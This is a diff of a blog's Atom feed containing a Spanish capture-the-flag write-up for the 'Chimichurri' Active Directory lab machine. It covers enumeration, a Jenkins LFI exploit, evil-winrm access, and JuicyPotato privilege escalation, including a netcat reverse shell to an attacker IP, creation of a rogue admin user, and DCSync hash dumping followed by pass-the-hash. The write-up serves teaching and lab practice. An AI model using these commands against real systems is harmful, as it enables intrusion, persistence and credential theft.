@@ -1,4 +1,483 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-10-20T20:57:52-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Blogger - Hack Journey</title><link href="http://localhost:4000/blogger-hackjourney/" rel="alternate" type="text/html" title="Blogger - Hack Journey" /><published>2024-10-16T00:00:00-06:00</published><updated>2024-10-16T00:00:00-06:00</updated><id>http://localhost:4000/blogger-hackjourney</id><content type="html" xml:base="http://localhost:4000/blogger-hackjourney/"><![CDATA[<p>Esta máquina es de la plataforma Hack Journey <a href="https://www.aprendehacking.com/products/hack-journey">visitar</a></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-11T22:06:22-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Chimichurri - The Hackers Labs</title><link href="http://localhost:4000/chimichurri-thehackerslabs/" rel="alternate" type="text/html" title="Chimichurri - The Hackers Labs" /><published>2024-11-11T00:00:00-06:00</published><updated>2024-11-11T00:00:00-06:00</updated><id>http://localhost:4000/chimichurri-thehackerslabs</id><content type="html" xml:base="http://localhost:4000/chimichurri-thehackerslabs/"><![CDATA[<p>Esta máquina es de la plataforma The Hackers Labs <a href="https://thehackerslabs.com/">visitar</a></p>
+
+<p>Certificaciones a aplicar: OSCP, eCPPTv3</p>
+
+<p>Dificultad: Fácil</p>
+
+<p>Técnicas Vistas:</p>
+
+<ul>
+  <li>SMB Enumeration</li>
+  <li>Information Leakage</li>
+  <li>RPC Enumeration (rpcclient)(Failed) (EXTRA)</li>
+  <li>Ldap Enumeration (ldapsearch)(Failed) (EXTRA)</li>
+  <li>AXFR - Domain Zone Transfer Attack (Failed)(EXTRA)</li>
+  <li>Kerberos User Enumeration (Kerbrute) (EXTRA)</li>
+  <li>ASRepRoast Attack (GetNPUsers)(Failed) (EXTRA)</li>
+  <li>SMB Password Spray Attack (Netexec) (EXTRA)</li>
+  <li>Jenkins Exploitation (LFI)</li>
+  <li>Abusing WinRM</li>
+  <li>Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]</li>
+  <li>DCSync Exploitation NTDS (secretsdump, Netexec)</li>
+  <li>PassTheHash (evil-winrm, wmiexec.py)</li>
+</ul>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/chimichurri.jpg" alt="chimichurri.jpg" /></p>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>192.168.179.144</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>En este caso como la maquina esta desplegada en VMware, en nuestra red local, para saber la ip empleamos la herramienta arp-scan como super usuario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arp-scan <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/Ip.png" alt="Ip.png" /></p>
+
+<p>En este caso esta es la ip asignada a la maquina.</p>
+
+<p>Comprobando conectividad con la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 192.168.179.144
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/ping.png" alt="ping.png" /></p>
+
+<p>Identificando el sistema operativo</p>
+
+<p>Empleamos un script hecho en python que en base al TTL nos dice ante que sistema operativo nos encontramos. El script fue hecho por <a href="https://x.com/s4vitar">s4vitar</a>, si quieren tenerlo se los dejo por aquí <a href="https://pastebin.com/HmBcu7j2">Descargar Script</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wichSystem.py 192.168.179.144
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/whichSystem.png" alt="whichSystem.png" /></p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Escaneo de los puertos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.141 <span class="nt">-oG</span> scanP
+
+<span class="c"># sudo Privilegios de administrador</span>
+<span class="c"># -p- Para que escanee todo el rango de puertos disponible (65,535)</span>
+<span class="c"># --open Solo muestre los puertos abiertos (no filtrados ni cerrados)</span>
+<span class="c"># -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)</span>
+<span class="c"># --min-rate 5000 Agilizar escaneo</span>
+<span class="c"># -vvv Nos reporte por consola a medida nos vaya descubriendo cosas</span>
+<span class="c"># -n Para que no aplique resolucion DNS (ralentiza el escaneo)</span>
+<span class="c"># -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)</span>
+<span class="c"># -oG Para guardar en formato Grep</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/scanP.png" alt="scanP.png" /></p>
+
+<p>Empleamos una utilidad llamada extractPorts, que nos permite sacar la información mas relevante de la captura Grep de nmap y copiar los puertos directamente a la clipboard, por eso guardamos en ese formato, para poder aprovechar esta utilidad y agilizar nuestro trabajo. Fue hecho por <a href="https://x.com/s4vitar">s4vitar</a>, si quieren tenerla se las dejo por aquí <a href="https://pastebin.com/tYpwpauW">Descargar Script</a>, Para usarla la deben incorporar en su .zshrc o .bashrc y instalar xclip.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Instalar xclip</span>
+apt <span class="nb">install </span>xclip
+
+<span class="c"># Usando la herramienta</span>
+extractPorts scanP 
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/extractPorts.png" alt="extractPorts.png" /></p>
+
+<p>Buscando vulnerabilidades en los servicios encontrados</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49668,49672,49673,49675,49681,49704,49739 192.168.179.144 <span class="nt">-oN</span> scanS
+
+<span class="c"># -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios</span>
+<span class="c"># -p Indicamos los puertos</span>
+<span class="c"># -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) </span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/scanS.png" alt="scanS.png" /></p>
+
+<p>Como observamos tenemos muchos servicios porque estamos ante un directorio activo, en el cual hay bastantes servicios corriendo en la maquina victima, vamos a ir paso a paso enumerando servicio por servicio.</p>
+
+<p>Importante como observamos en el escaneo nos muestra un dominio el cual para muchos de los ataques es indispensable que lo agreguemos al /etc/hosts.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dominio.png" alt="dominio.png" /></p>
+
+<p>Lo primero que haremos ya que tenemos el puerto 445 (SMB) abierto, que es el servicio para compartir recursos mediante la red, sera identificar ante que nos enfrentamos, para esto usaremos NetExec.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/nxc_smb.png" alt="nxc smb.png" /></p>
+
+<p>Vemos que estamos ante un windows server 2016 y también nos muestra el dominio que previamente identificamos con Nmap.</p>
+
+<p>Ahora miraremos si hay algún recurso compartido al cual podemos acceder sin proporcionar contraseña. empleando null session o con usuarios comunes como default, guest, invitado, etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/nxc_shares.png" alt="nxc shares.png" /></p>
+
+<p>Vemos que tenemos un recurso bastante inusual llamado drogas en el cual tenemos permisos de lectura, aquí tenemos varias herramientas para utilizar y llegar a enumerar el contenido, podemos hacerlo con NetExec, SmbMap o SmbClient. En nuestro caso usaremos SmbClient ya que resulta bastante cómoda para estas tareas pero siempre nos apoyamos de las otras ya que en SmbClient no nos muestra que tipo de permisos poseemos sobre un recurso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Conectarnos al recurso</span>
+smbclient //192.168.179.144/drogas <span class="nt">-N</span>
+
+<span class="c">#Listamos el contenido</span>
+<span class="nb">dir</span>
+
+<span class="c">#Descargar el archivo</span>
+get <span class="o">{</span>file<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/smbclient.png" alt="smbclient.png" /></p>
+
+<p>Nos conectamos con éxito y vemos un txt dentro. Ahora nos vamos a descargar ese archivo para ver que contiene.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/getfile.png" alt="getfile.png" /></p>
+
+<p>Lo descargamos en el directorio que ejecutamos SmbClient.</p>
+
+<p>Vemos que el archivo nos da 2 cosas.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/credenciales.png" alt="credenciales.png" /></p>
+
+<p>Una de ellas es un usuario y una pista de donde esta su contraseña.</p>
+
+<p>Continuamos enumerando, Como mencione antes, enumeraremos como normalmente se haría en AD, para ver un poco las herramientas y servicios que suelen contener información importante que nos puede ser de utilidad, aunque en esta maquina no la encontremos, nos servirá mucho para otras que realicemos.</p>
+
+<p>Enumerando RPC, usamos rpcclient para enumerar usuarios del dominio, grupos del dominio, descripciones de los usuarios o grupos etc.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Null Session</span>
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> 192.168.179.144 <span class="nt">-N</span>
+
+<span class="c">#Si disponemos de credenciales</span>
+rpcclient <span class="nt">-U</span> <span class="s2">"user%pass"</span> <span class="o">{</span>IP_Victim<span class="o">}</span> 
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/rpcclient.png" alt="rpcclient.png" /></p>
+
+<p>Nos conectamos con éxito ahora los comandos que suelen utilizarse son los siguientes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Para ver info de usuarios del dominio</span>
+enumdomusers
+
+<span class="c">#Para ver grupos del dominio</span>
+enumdomgroups
+
+<span class="c">#Ver usuarios admin del dominio suelen tener el rid 0x200, todos los rid que reporte seran usuarios miembros de este grupo</span>
+querygroupmem 0x200
+
+<span class="c">#Para ver un usuario en base al rid</span>
+queryuser rid
+
+<span class="c">#Para ver las descripciones de los usuarios</span>
+querydispinfo
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/enumdomusers.png" alt="enumdomusers.png" /></p>
+
+<p>Vemos que no tenemos éxito, quiere decir que no permite null session y no podremos enumerar nada.</p>
+
+<p>Enumeramos LDAP para ver información que también nos pueda ser útil, a veces encontramos usuarios entre otras cosas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumeramos los naming contexts</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://192.168.179.144 <span class="nt">-s</span> <span class="s1">'base'</span> namingcontext
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/ldapsearch_nc.png" alt="ldapsearch nc.png" /></p>
+
+<p>Tomamos el primer valor de los naming contexts</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Tomamos el primer resultado de namingcontexts</span>
+ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://192.168.179.144 <span class="nt">-b</span> <span class="s1">'DC=chimichurri,DC=thl'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/ldapsearch_b.png" alt="ldapsearch b.png" /></p>
+
+<p>No encontramos nada, recordemos esto lo hacemos solo para ver lo que normalmente se enumera en un DC.</p>
+
+<p>Podemos probar también a lanzar una solicitud dns para ver si logramos hacer un ataque que se conoce como domain zone transfer.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Lanzar solicitud dns al dominio</span>
+
+dig @192.168.179.144 chimichurri.thl
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dig_solicitud_dns.png" alt="dig solicitud dns.png" /></p>
+
+<p>Ver nombres de dominio</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumerar nombres de dominio</span>
+dig @192.168.179.144 chimichurri.thl ns
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dig_ns.png" alt="dig ns.png" /></p>
+
+<p>Ver servidores de correo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Enumerar servidores de correo</span>
+
+dig @192.168.179.144 chimichurri.thl mx
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dig_mx.png" alt="dig mx.png" /></p>
+
+<p>Ataque Domain Zone Transfer</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Ataque domain zone transfer sirve para ver todos los subdomninios en caso de que existan, para agregarlos al /etc/hosts en caso de que se aplique virtualhosting y así ahorrar la fuerza bruta</span>
+
+dig @192.168.179.144 chimichurri.thl axfr
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dig_dzt.png" alt="dig dzt.png" /></p>
+
+<p>En este caso no encontramos nada.</p>
+
+<p>Podemos ir directamente a la maquina pero vamos a enumerar posibles usuarios a nivel de dominio. Hay usuarios que suelen ser comunes en estos entornos, podemos probar creando una pequeña lista y validarlos con kerbrute y ucon impacket-GetNPUsers.</p>
+
+<p>Enumerando usuarios y aparte probara por defecto el ASREPRoast que es un ataque que explota a los usuarios que carecen del atributo requerido de pre-autenticación de Kerberos.</p>
+
+<p>Primero creamos este pequeño diccionario.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/dic.png" alt="dic.png" /></p>
+
+<p>Kerbrute</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="nt">-d</span> chimichurri.thl <span class="nt">--dc</span> 192.168.179.144 users.txt
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/kerbrute.png" alt="kerbrute.png" /></p>
+
+<p>Vemos que nos a encontrado 3 usuarios validos a nivel de dominio, del cual ya conocíamos uno. Pero ninguno tiene el atributo requerido de pre-autenticación de Kerberos, ya que si un usuario lo tuviera nos mostraría un hash el cual podemos tratar de crackear de manera offline.</p>
+
+<p>impacket-GetNPUsers</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt chimichurri.thl/
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/Get-NPUsers.png" alt="Get-NPUsers.png" /></p>
+
+<p>De esta manera también podemos validar los usuarios que existen, ya que como observamos en la imagen para aquellos usuarios que no son validos el mensaje cambia, en los que son validos el mensaje es doesn’t have UF_DONT_REQUIRE_PREAUTH set.</p>
+
+<p>Seguimos con la maquina? pues todavía no, ahora mostrare otra técnica llamada password spraying, ahora que tenemos 3 usuarios validos borramos los demás y nos quedamos únicamente con estos para realizar la prueba. Crearemos un diccionario sencillo solo para mostrar como se hace.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/usersdc.png" alt="usersdc.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#--continue-on-success es para que siga probando aunque nos encuentre una credencial valida, ya que si no le indicamos este parametro, cuando encuentre la primera se va a detener.</span>
+nxc smb 192.168.179.144 <span class="nt">-u</span> users.txt <span class="nt">-p</span> dic.txt <span class="nt">--continue-on-success</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/passwordspraying.png" alt="passwordspraying.png" /></p>
+
+<p>Vemos que de esta forma detectamos 2 credenciales para 2 usuarios. Lo dejaremos por aquí de momento y ahora sigamos con la maquina. Espero estas técnicas les sirvan para futuras maquinas en hacking de AD.</p>
+
+<p>Ahora si continuemos con la maquina. Repasando un poco, ya que analizamos varios servicios donde en algunos sacamos alguna información interesante no encontramos mas, así que revisemos el escaneo de nmap de nuevo.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/catscanS.png" alt="catscanS.png" /></p>
+
+<p>Vemos que hay Jenkins corriendo en ese puerto, vamos a ver que nos muestra.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/jenkins.png" alt="jenkins.png" /></p>
+
+<p>En efecto tenemos un jenkins, revisando un poco, tenemos un login para el cual tampoco tenemos credenciales, revisando un poco mas y si tenemos buen ojo lograremos enumerar algo interesante.</p>
+
+<p>Utilizando whatweb también podemos ver eso interesante.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/whatweb.png" alt="whatweb.png" /></p>
+
+<p>Obtenemos la version de jenkins y como no poseemos credenciales, podemos buscar algún exploit para esa version o una version un poco mas arriba.</p>
+
+<h1 id="explotación">Explotación</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit Jenkins 2.
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/searchsploit.png" alt="searchsploit.png" /></p>
+
+<p>Encontramos un exploit para la version 2.441 que contempla un LFI, vamos a probarlo. Nos copiamos el exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="nt">-m</span> java/webapps/51993.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/searchsploit-m.png" alt="searchsploit-m.png" /></p>
+
+<p>Ahora lo renombrare y lo probaremos para ver que nos solicita.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python jexploit.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/jpexploit.png" alt="jpexploit.png" /></p>
+
+<p>Vemos que nos pide la url y una ruta. Esto nos devuelve al archivo que encontramos en el smb el cual nos decía que el usuario hacker tienes sus credenciales como perico en el escritorio. Recordemos como suelen estar ubicadas las carpetas de los usuarios en sistemas windows.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python jexploit.py <span class="nt">-u</span> http://192.168.179.144:6969/ <span class="nt">-p</span> /Users/hacker/Desktop/perico.txt <span class="o">&gt;</span> creds.txt
+</code></pre></div></div>
+
+<p>De esta manera redirigimos la salida del comando para que la guarde en un archivo llamado creds.txt</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/creds.png" alt="creds.png" /></p>
+
+<p>Vemos que tenemos el archivo, si lo revisamos encontraremos las credenciales para el usuario hacker.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/hackercreds.png" alt="hackercreds.png" /></p>
+
+<p>Ahora vamos a comprobar si esas credenciales son validas con NetExec. Si nos coloca Pwn3d! significa que este usuario posee privilegios altos y podríamos usar Psexec para conectarnos, de lo contrario si coloca un + significa que solo son validas, si coloca un - no son validas. También comprobaremos con el servicio de administración remota de windows (winrm), si aquí nos coloca Pwn3d! nos podremos conectar con Evil-Winrm.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/nxc_creds.png" alt="nxc creds.png" /></p>
+
+<p>Solo nos coloca + significa que son validas pero no podemos usar psexec para conectarnos.</p>
+
+<p>Ahora comprobamos con el servicio winrm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc winrm 192.168.179.144 <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/nxc_winrm.png" alt="nxc winrm.png" /></p>
+
+<p>Como observamos nos coloca Pwn3d!, entonces nos podemos conectar con Evil-Winrm.</p>
+
+<p>Evil-Winrm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-u</span> <span class="s1">'hacker'</span> <span class="nt">-p</span> <span class="s1">'pass'</span> <span class="nt">-i</span> 192.168.179.144
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/evil-winrm.png" alt="evil-winrm.png" /></p>
+
+<p>Estamos dentro de la maquina como el usuario hacker, ahora nos queda buscar una manera de elevar privilegios y convertirnos en el usuario Administrador del Dominio.</p>
+
+<h1 id="escalada-de-privilegios-post-explotación">Escalada de Privilegios (Post Explotación)</h1>
+
+<p>Como siguiente paso el objetivo es convertirnos en usuarios administradores del dominio, para eso realizaremos las siguientes acciones</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Ver info general de un usuario</span>
+net user usuario
+
+<span class="c">#Ver los grupos</span>
+net group o net localgroup
+
+<span class="c">#ver los privilegios que posee ese usuario</span>
+<span class="nb">whoami</span> /priv
+
+<span class="c">#Ver toda la info del usuario</span>
+<span class="nb">whoami</span> /all
+
+<span class="c">#Ver si el usuario pertenece a ese grupo de manera local o a nivel de dominio</span>
+net localgroup <span class="s2">"grupo"</span> o net group <span class="s2">"grupo"</span>
+
+</code></pre></div></div>
+
+<p>Info general del usuario</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/netuser.png" alt="netuser.png" /></p>
+
+<p>Grupos</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/netgroup.png" alt="netgroup.png" /></p>
+
+<p>La información que obtengamos de aquí nos va a ser muy útil para saber por donde vamos a escalar privilegios, no siempre va a ser así, en otros casos nos tocara recurrir a otras herramientas para enumerar de una mejor manera.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/whoami-priv.png" alt="whoami-priv.png" /></p>
+
+<p>Al observar los privilegios vemos que hay uno interesante, vamos a ver como podemos aprovecharnos de este y escalar privilegios.</p>
+
+<p>Podemos usar dos herramientas JuicyPotato o PetitPotato. En este caso usaremos la primera.</p>
+
+<p>Lo primero sera descargar la herramienta desde aquí <a href="https://github.com/ohpe/juicy-potato/releases">JuicyPotato</a> luego la transferimos a la maquina victima. Primero nos crearemos un folder en tmp, para organizar mejor nuestro trabajo, luego aquí subiremos lo que necesitemos.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/Privesc.png" alt="Privesc.png" /></p>
+
+<p>Ya tenemos creado el folder al cual llamamos Privesc.</p>
+
+<p>Transferimos el JuicyPotato a la maquina victima. Renombramos el ejecutable a Jp.exe para mas comodidad.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/mvJp.png" alt="mvJp.png" /></p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/transferJp.png" alt="transferJp.png" /></p>
+
+<p>Ya lo tenemos. Continuamos, vamos a hacer 2 cosas pasar un netcat y obtener una reverseshell y luego crear un usuario y agregarlo al grupo de administradores. En este caso haremos las 2, para que vean como se hace. Buscamos el nc.exe en nuestro sistema o lo descargamos, una ves hecho eso lo trasnferimos.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/nc.png" alt="nc.png" /></p>
+
+<p>Ya con esto probamos lo siguiente, nos ponemos en escucha en nuestro equipo y ejecutamos el JuicyPotato de la siguiente manera, (Depende el SO ante el que estemos, si da algun error deberemos buscar el CLSID adecuado en el mismo repo <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">CLISD</a> buscar la version y seleccionar uno que ejecute NT Authority System). En este caso funciona con el que lanza por defecto.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\P</span><span class="s2">rivesc</span><span class="se">\n</span><span class="s2">c.exe -e cmd 192.168.179.139 4444"</span>
+</code></pre></div></div>
+
+<p>Observamos que obtenemos la conexion sin problemas como NT Authority Systerm</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/ntAuth.png" alt="ntAuth.png" /></p>
+
+<p>Solo que si tratamos de ver las flags no nos deja ya que debemos ser Usuario admin del dominio para poder verlas.  ya siendo NT Authority System podemos realizar los pasos de abajo sin usar JuicyPotato.</p>
+
+<p>Creación del usuario y agregarlo al grupo administradores.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Creacion del usuario</span>
+.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user ewor01 pass123! /add"</span>
+
+<span class="c">#Agregar al grupo Administradores</span>
+.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net localgroup Administradores ewor01 /add"</span>
+
+<span class="c">#Para que en crackmapexec por smb nos ponga pwned y poder hacer de todo con ese usuario, hay que retocar el siguiente registro</span>
+.<span class="se">\J</span>uicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-l</span> 1337 <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/useradd.png" alt="useradd.png" /></p>
+
+<p>Al ejecutar los primeros 2 y verificar con netexec vemos que nos pone un +, si queremos que nos coloque Pwn3d! debemos retocar un registro para el cual es el tercer comando y tener capacidad de conectarnos como usuario privilegiado con el usuario que acabamos de agregar.</p>
+
+<p>Usuario agregado con privilegios.</p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/userpriv.png" alt="userpriv.png" /></p>
+
+<p>Podremos conectarnos como el usuario que hemos agregado, con evilwin-rm pero no podríamos ver las flag debido a que debemos ser usuarios administradores del dominio, para eso Vamos a realizar un dumping de los hashes de los usuarios con netexec o con secrests-dump mediante NTDS (NTDS, o NT Directory Services, es el archivo de base de datos de Microsoft Active Directory) empleando un Dcsync attack.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#secretsdump, Nos va a solicitar la contrasenia del usuario la colocamos y listo.</span>
+impacket-secretsdump chimichurri.thl/ewor01@192.168.179.144
+
+<span class="c">#Netexec </span>
+nxc smb 192.168.179.144 <span class="nt">-u</span> <span class="s1">'ewor01'</span> <span class="nt">-p</span> <span class="s1">'pass123!'</span> <span class="nt">--ntds</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/secrets-dump.png" alt="secrets-dump.png" /></p>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/ntds.png" alt="ntds.png" /></p>
+
+<p>El hash que nos interesa es el del usuario administrador, no necesitamos conocer su contraseña ya que realizaremos una técnica llamada pass the hash para conectarnos a la maquina mediante evilwin-rm.</p>
+
+<p>Primero comprobamos el hash del usuario Administrador.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc winrm 192.168.179.144 <span class="nt">-u</span> <span class="s1">'Administrador'</span> <span class="nt">-H</span> <span class="s1">'hash'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/thl-writeup-chimichurri/domainAdmin.png" alt="domainAdmin.png" /></p>
+
+<p>Ahora solo nos queda conectarnos con evil-winrm, psexec o wmiexec para emplear Pass the hash. Al usar psexec sucede algo, siempre ingresa como NT Authority System y no como Admin del dominio, con wmiexec si funciona correctamente.</p>
+
